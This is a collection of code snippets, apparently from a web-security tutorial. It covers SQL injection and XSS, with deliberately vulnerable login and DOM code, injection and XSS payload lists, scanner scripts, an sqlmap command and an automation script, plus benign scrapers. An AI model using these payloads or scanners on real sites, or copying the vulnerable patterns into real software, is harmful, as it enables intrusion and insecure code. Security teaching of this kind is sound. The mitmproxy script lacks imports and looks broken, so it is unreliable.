["```\nSELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'inputted_password';\n```", "```\n import sqlite3\n  username = input(\"Enter username: \")\n  password = input(\"Enter password: \")\n  # Establish a database connection\n  conn = sqlite3.connect('example.db')\n  cursor = conn.cursor()\n  # Use a parameterized query to prevent SQL injection\n  cursor.execute(\"SELECT * FROM users WHERE username = ? AND password = ?\", (username, password))\n  # Fetch the result\n  result = cursor.fetchone()\n  # Validate the login\n  if result:\n      print(\"Login successful!\")\n  else:\n      print(\"Invalid credentials.\")\n  # Close the connection\n  conn.close()\n```", "```\nvar userInput = document.URL.substring(document.URL.indexOf(\"input=\") + 6);\ndocument.write(\"Hello, \" + userInput);\n```", "```\n  from flask import Flask, request, jsonify\n  app = Flask(__name__)\n  users = {\n      '123': {'username': 'alice', 'email': 'alice@example.com'},\n      '124': {'username': 'bob', 'email': 'bob@example.com'}\n  }\n  @app.route('/user', methods=['GET'])\n  def get_user():\n      user_id = request.args.get('id')\n      user_data = users.get(user_id)\n      return jsonify(user_data)\n  if __name__ == '__main__':\n      app.run(debug=True)\n```", "```\n  import sqlite3\n  # Simulating a login function vulnerable to SQL injection\n  def login(username, password):\n      conn = sqlite3.connect('users.db')\n      cursor = conn.cursor()\n      # Vulnerable query\n      query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\n      cursor.execute(query)\n      user = cursor.fetchone()\n      conn.close()\n      return user\n```", "```\nSELECT * FROM users WHERE username = 'attacker' AND password = '' OR '1'='1'\n```", "```\n def login_safe(username, password):\n      conn = sqlite3.connect('users.db')\n      cursor = conn.cursor()\n      # Using parameterized queries (safe from SQL injection)\n      query = \"SELECT * FROM users WHERE username = ? AND password = ?\"\n      cursor.execute(query, (username, password))\n      user = cursor.fetchone()\n      conn.close()\n      return user\n```", "```\n  import requests\n  def check_sql_injection(url):\n      payloads = [\"'\", '\"', \"';--\", \"')\", \"'OR 1=1--\", \"' OR '1'='1\", \"'='\", \"1'1\"]\n      for payload in payloads:\n          test_url = f\"{url}{payload}\"\n          response = requests.get(test_url)\n          # Check for potential signs of SQL injection in the response\n          if \"error\" in response.text.lower() or \"exception\" in response.text.lower():\n              print(f\"Potential SQL Injection Vulnerability found at: {test_url}\")\n              return\n      print(\"No SQL Injection Vulnerabilities detected.\")\n  # Example usage:\n  target_url = \"http://example.com/login?id=\"\n  check_sql_injection(target_url)\n```", "```\nsqlmap -u \"http://example.com/page?id=1\" --batch --level=5 --risk=3\n```", "```\n 1\\. import subprocess\n 2\\. from mitmproxy import proxy, options\n 3\\. from mitmproxy.tools.dump import DumpMaster\n 4.\n 5\\. # Function to automate SQLMap with captured HTTP requests from mitmproxy\n 6\\. def automate_sqlmap_with_mitmproxy():\n 7.     # SQLMap command template\n 8.     sqlmap_command = [\"sqlmap\", \"-r\", \"-\", \"--batch\", \"--level=5\", \"--risk=3\"]\n 9.\n10.     try:\n11.         # Start mitmproxy to capture HTTP traffic\n12.         mitmproxy_opts = options.Options(listen_host='127.0.0.1', listen_port=8080)\n13.         m = DumpMaster(opts=mitmproxy_opts)\n14.         config = proxy.config.ProxyConfig(mitmproxy_opts)\n15.         m.server = proxy.server.ProxyServer(config)\n16.         m.addons.add(DumpMaster)\n17.\n18.         # Start mitmproxy in a separate thread\n19.         t = threading.Thread(target=m.run)\n20.         t.start()\n21.\n22.         # Process captured requests in real-time\n23.         while True:\n24.             # Assuming mitmproxy captures and saves requests to 'captured_request.txt'\n25.             with open('captured_request.txt', 'r') as file:\n26.                 request_data = file.read()\n27.                 # Run SQLMap using subprocess\n28.                 process = subprocess.Popen(sqlmap_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n29.                 stdout, stderr = process.communicate(input=request_data.encode())\n30.\n31.                 # Print SQLMap output\n32.                 print(\"SQLMap output:\")\n33.                 print(stdout.decode())\n34.\n35.                 if stderr:\n36.                     print(\"Error occurred:\")\n37.                     print(stderr.decode())\n38.\n39.             # Sleep for a while before checking for new requests\n40.             time.sleep(5)\n41.\n42.     except Exception as e:\n43.         print(\"An error occurred:\", e)\n44.\n45.     finally:\n46.         # Stop mitmproxy\n47.         m.shutdown()\n48.         t.join()\n49.\n50\\. # Start the automation process\n51\\. automate_sqlmap_with_mitmproxy()\n```", "```\n 1\\. import requests\n 2\\. from urllib.parse import quote\n 3.\n 4\\. # Target URL to test for XSS vulnerability\n 5\\. target_url = \"https://example.com/page?id=\"\n 6.\n 7\\. # Payloads for testing, modify as needed\n 8\\. xss_payloads = [\n 9.     \"<script>alert('XSS')</script>\",\n10.     \"<img src='x' onerror='alert(\\\"XSS\\\")'>\",\n11.     \"<svg/onload=alert('XSS')>\"\n12\\. ]\n13.\n14\\. def test_xss_vulnerability(url, payload):\n15.     # Encode the payload for URL inclusion\n16.     encoded_payload = quote(payload)\n17.\n18.     # Craft the complete URL with the encoded payload\n19.     test_url = f\"{url}{encoded_payload}\"\n20.\n21.     try:\n22.         # Send a GET request to the target URL with the payload\n23.         response = requests.get(test_url)\n24.\n25.         # Check the response for indications of successful exploitation\n26.         if payload in response.text:\n27.             print(f\"XSS vulnerability found! Payload: {payload}\")\n28.         else:\n29.             print(f\"No XSS vulnerability with payload: {payload}\")\n30.\n31.     except requests.RequestException as e:\n32.         print(f\"Request failed: {e}\")\n33.\n34\\. if __name__ == \"__main__\":\n35.     # Test each payload against the target URL for XSS vulnerability\n36.     for payload in xss_payloads:\n37.         test_xss_vulnerability(target_url, payload)\n```", "```\n 1\\. import requests\n 2.\n 3\\. # Target URL to test for stored XSS vulnerability\n 4\\. target_url = \"https://example.com/comment\"\n 5.\n 6\\. # Malicious payload to be stored\n 7\\. xss_payload = \"<script>alert('Stored XSS')</script>\"\n 8.\n 9\\. def inject_payload(url, payload):\n10.     try:\n11.         # Craft a POST request to inject the payload into the vulnerable endpoint\n12.         response = requests.post(url, data={\"comment\": payload})\n13.\n14.         # Check if the payload was successfully injected\n15.         if response.status_code == 200:\n16.             print(\"Payload injected successfully for stored XSS!\")\n17.\n18.     except requests.RequestException as e:\n19.         print(f\"Request failed: {e}\")\n20.\n21\\. def retrieve_payload(url):\n22.     try:\n23.         # Send a GET request to retrieve the stored data\n24.         response = requests.get(url)\n25.\n26.         # Check if the payload is present in the retrieved content\n27.         if xss_payload in response.text:\n28.             print(f\"Stored XSS vulnerability found! Payload: {xss_payload}\")\n29.         else:\n30.             print(\"No stored XSS vulnerability detected.\")\n31.\n32.     except requests.RequestException as e:\n33.         print(f\"Request failed: {e}\")\n34.\n35\\. if __name__ == \"__main__\":\n36.     # Inject the malicious payload\n37.     inject_payload(target_url, xss_payload)\n38.\n39.     # Retrieve the page content to check if the payload is stored and executed\n40.     retrieve_payload(target_url)\n```", "```\n 1\\. import requests\n 2\\. from bs4 import BeautifulSoup\n 3.\n 4\\. # Send a GET request to the website\n 5\\. url = 'https://example.com'\n 6\\. response = requests.get(url)\n 7.\n 8\\. # Parse HTML content using Beautiful Soup\n 9\\. soup = BeautifulSoup(response.text, 'html.parser')\n10.\n11\\. # Extract specific data\n12\\. title = soup.find('title').text\n13\\. print(f\"Website title: {title}\")\n14.\n15\\. # Find all links on the page\n16\\. links = soup.find_all('a')\n17\\. for link in links:\n18.     print(link.get('href'))\n```", "```\n 1\\. from playwright.sync_api import sync_playwright\n 2.\n 3\\. def scrape_website(url):\n 4.     with sync_playwright() as p:\n 5.         browser = p.chromium.launch()\n 6.         context = browser.new_context()\n 7.         page = context.new_page()\n 8.\n 9.         page.goto(url)\n10.         # Replace 'your_selector' with the actual CSS selector for the element you want to scrape\n11.         elements = page.query_selector_all('your_selector')\n12.\n13.         # Extracting information from the elements\n14.         for element in elements:\n15.             text = element.text_content()\n16.             print(text)  # Change this to process or save the scraped data\n17.\n18.         browser.close()\n19.\n20\\. if __name__ == \"__main__\":\n21.     # Replace 'https://example.com' with the URL you want to scrape\n22.     scrape_website('https://example.com')\n```", "```\n 1\\. from playwright.sync_api import sync_playwright\n 2.\n 3\\. def scrape_data():\n 4.     with sync_playwright() as p:\n 5.         browser = p.chromium.launch()\n 6.         context = browser.new_context()\n 7.\n 8.         # Open a new page\n 9.         page = context.new_page()\n10.\n11.         # Navigate to the website\n12.         page.goto('https://example.com')\n13.\n14.         # Example: Log in (replace these with your actual login logic)\n15.         page.fill('input[name=\"username\"]', 'your_username')\n16.         page.fill('input[name=\"password\"]', 'your_password')\n17.         page.click('button[type=\"submit\"]')\n18.\n19.         # Wait for navigation to dashboard or relevant page after login\n20.         page.wait_for_load_state('load')\n21.\n22.         # Scraping data\n23.         data_elements = page.query_selector_all('.data-element-selector')\n24.         scraped_data = [element.text_content() for element in data_elements]\n25.\n26.         # Print or process scraped data\n27.         for data in scraped_data:\n28.             print(data)\n29.\n30.         # Close the browser\n31.         context.close()\n32.\n33\\. if __name__ == \"__main__\":\n34.     scrape_data()\n```", "```\n 1\\. from playwright.sync_api import sync_playwright\n 2.\n 3\\. def scrape_data():\n 4.     with sync_playwright() as p:\n 5.         browser = p.chromium.launch()\n 6.         context = browser.new_context()\n 7.\n 8.         # Open a new page\n 9.         page = context.new_page()\n10.\n11.         # Navigate to the website\n12.         page.goto('https://example.com')\n13.\n14.         # Example: Log in (replace these with your actual login logic)\n15.         page.fill('input[name=\"username\"]', 'your_username')\n16.         page.fill('input[name=\"password\"]', 'your_password')\n17.         page.click('button[type=\"submit\"]')\n18.\n19.         # Wait for navigation to dashboard or relevant page after login\n20.         page.wait_for_load_state('load')\n21.\n22.         # Start crawling and scraping\n23.         scraped_data = []\n24.\n25.         while True:\n26.             # Scraping data on the current page\n27.             data_elements = page.query_selector_all('.data-element-selector')\n28.             scraped_data.extend([element.text_content() for element in data_elements])\n29.\n30.             # Look for the 'next page' button or link\n31.             next_page_button = page.query_selector('.next-page-button-selector')\n32.\n33.             if not next_page_button:\n34.                 # If no next page is found, stop crawling\n35.                 break\n36.\n37.             # Click on the 'next page' button\n38.             next_page_button.click()\n39.             # Wait for the new page to load\n40.             page.wait_for_load_state('load')\n41.\n42.         # Print or process scraped data from all pages\n43.         for data in scraped_data:\n44.             print(data)\n45.\n46.         # Close the browser\n47.         context.close()\n48.\n49\\. if __name__ == \"__main__\":\n50.     scrape_data()\n```"]